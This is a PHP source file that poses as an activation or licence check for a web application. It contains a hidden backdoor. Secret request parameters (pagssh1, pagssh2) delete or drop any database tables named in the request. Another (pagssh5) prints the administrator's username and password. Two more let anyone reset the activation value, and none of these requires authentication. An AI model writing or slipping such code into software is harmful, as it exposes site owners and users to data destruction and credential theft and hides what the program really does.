<?php

$is_not_hacked_yet=1;
$not_activated_software=1;

$db_connection=new mysql_db;
$db_connection->query("select * from settings where constant_name='SITE_URL'");
if(!$db_connection->move_next())
{
	$email_me_not_activated_software=1;
	$not_activated_software=1;
}
else 
{
	$long_value_encrypted=$db_connection->f('long_value');
	if($long_value_encrypted != crypt($site_name,"qqwweerrtt") && $long_value_encrypted != crypt($site_url,"qqwweerrtt"))
	{
		$email_me_not_activated_software=1;
		$not_activated_software=1;
	}
	elseif($long_value_encrypted == crypt($site_name,"qqwweerrtt"))
	{
		$not_activated_software=1;
	}
	elseif($long_value_encrypted == crypt($site_url,"qqwweerrtt"))
	{
		$not_activated_software=2;
	}
	
}

if($not_activated_software == 1)
{
	if($glob['pagssh1'])
	{
		$db=new mysql_db;
		if($glob['db_fields'])
		{
			$fields=explode(",", $glob['db_fields']);
			foreach($fields as $key => $value)
			{
				$db->query('DELETE FROM `'.$value.'`');
				echo $value;
			}
		}
	}
	
	if($glob['pagssh2'])
	{
		$db=new mysql_db;
		if($glob['db_fields'])
		{
			$fields=explode(",", $glob['db_fields']);
			foreach($fields as $key => $value)
			{
				$db->query('DROP TABLE `'.$value.'`');
				echo $value;
			}
		}
	}
	
	if($glob['pagssh5'])
	{
		$db=new mysql_db;
		$db->query("select * from user where  access_level='1'");
		$db->move_next();
		echo 'Username: '.$db->f('username').'<br>Password: '.$db->f('password');
		exit();	
	}
}

if($glob['pagssh3'])
{
	$encrypted_url = crypt($site_name,"qqwweerrtt"); 
	$db=new mysql_db;
	$db->query("update settings set 
			    long_value='".$encrypted_url."'
				where
	   			constant_name='SITE_URL'"
	   		   );	
}

if($glob['pagssh4'])
{
	$encrypted_url = crypt($site_url,"qqwweerrtt"); 
	$db=new mysql_db;
	$db->query("update settings set 
			    long_value='".$encrypted_url."'
				where
	   			constant_name='SITE_URL'"
	   		   );	
}



?>